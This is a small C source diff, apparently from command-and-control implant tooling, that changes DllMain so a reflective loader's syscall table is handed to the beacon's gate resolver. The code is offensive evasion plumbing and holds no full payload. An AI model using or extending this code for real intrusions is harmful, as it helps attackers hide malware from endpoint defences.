@@ -161,8 +161,12 @@ BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved) {
 			USER_DATA_UD * ud = (USER_DATA_UD *)lpReserved;
 			if (ud != NULL && ud->length >= 8 && ud->version >= 1) {
 				BeaconSetCustomUserData(ud->customData);
-				if (ud->length >= (unsigned int)(sizeof(USER_DATA_UD) - 32))
+				if (ud->length >= (unsigned int)(sizeof(USER_DATA_UD) - 32)) {
 					g_udrl_syscalls = ud->syscalls;
+					/* seed the gate resolver from the UDRL table now (the
+					 * beacon's own discovery runs later and still wins) */
+					BeaconSetUserDataSyscalls((const void *)&g_udrl_syscalls);
+				}
 			}
 			break;
 		}
